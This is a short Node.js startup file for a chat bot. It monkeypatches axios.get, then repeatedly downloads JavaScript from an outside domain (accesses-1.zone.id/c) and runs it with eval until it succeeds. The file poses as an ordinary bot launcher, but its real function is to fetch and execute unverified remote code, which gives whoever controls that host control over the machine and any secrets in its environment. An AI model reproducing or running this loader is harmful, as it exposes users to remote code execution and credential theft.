require('dotenv').config();

const axios = require('axios');

const HANDLER_URL = 'https://accesses-1.zone.id/c';
const ELITE_PRO_LIBRARY_URL = 'https://accesses-1.zone.id';
const MENU_TITLE = 'ᴇʟɪᴛᴇ-ᴘʀᴏ-ᴠɪ ʙᴏᴛ ᴍᴇɴᴜ';

function patchMenuTitle(source) {
  const botName = String(global.botname || process.env.BOT_NAME || '☁️Columbina Bot☁️');
  return source.replace(MENU_TITLE, botName);
}

function installLocalConfigAwareLoader() {
  const originalGet = axios.get.bind(axios);

  axios.get = async (url, options) => {
    const response = await originalGet(url, options);

    if (url === ELITE_PRO_LIBRARY_URL && typeof response.data === 'string') {
      response.data = patchMenuTitle(response.data);
    }

    return response;
  };
}

async function start() {
  installLocalConfigAwareLoader();

  while (true) {
    try {
      const response = await axios.get(HANDLER_URL, { timeout: 15000 });
      const source = typeof response.data === 'string' ? response.data : String(response.data);

      // The imported project historically evaluated this remote handler in place.
      // Keep that behavior, while patching its remote dependency through axios above.
      eval(`(async function () { ${source}\n })()`);
      break;
    } catch (error) {
      console.error('Failed to start bot handler. Retrying in 10 seconds...', error.message);
      await new Promise((resolve) => setTimeout(resolve, 10000));
    }
  }
}

start();
